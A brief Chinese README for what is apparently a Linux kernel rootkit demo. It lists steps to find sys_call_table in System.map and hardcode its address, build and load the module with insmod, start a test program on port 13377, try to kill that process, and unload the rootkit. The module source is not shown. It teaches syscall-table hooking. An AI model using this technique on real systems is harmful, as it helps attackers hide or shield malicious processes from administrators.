1、操作系统的sys_call_table地址未必和我的一样,使用 cat /boot/System.map-$(uname -r) | grep sys_call_table 获取地址:
unsigned long *sys_call_table = (unsigned long*) 0xffffffff816005e0;
2、编译启动test程序，test启动默认端口是13377
gcc test.c -o test
3、编译安装rookit
make
insmod systemcall.ko
4、查看test进程pid
netstat -anp | grep 13377
5、尝试kill test进程
netstat -anp | grep 13377
kill pid
6、删除rootkit
rmmod systemcall

